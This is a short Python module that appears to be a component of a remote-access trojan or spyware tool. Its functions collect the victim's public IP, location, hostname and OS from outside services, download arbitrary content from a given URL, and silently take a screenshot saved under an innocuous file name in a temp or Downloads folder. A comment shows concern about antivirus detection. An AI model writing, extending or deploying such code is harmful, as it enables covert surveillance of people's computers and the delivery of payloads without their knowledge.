from socket import gethostname
from requests import get
from pyautogui import screenshot
from getpass import getuser # COULD CAUSE ANTIVIRUS DETECTION!
import json, platform, os

def get_ip():
    return get('https://api.ipify.org').content.decode()

def get_information():
    info = json.loads(get('http://ipinfo.io/json').content.decode())
    info["hostname"] = gethostname()
    info["os"] = platform.system()+" "+platform.release()
    return info

def download_file(url):
    file = get(url).content
    return file if type(file) == bytes else file.encode()

def get_screenshot():
    if platform.system().lower() == "windows":
        savePath = os.path.join(os.getenv('TEMP'), "Image26.png")
    else:
        savePath = "/home/"+getuser()+"/Downloads/Image26.png"
    screenshot().save(savePath)
    return savePath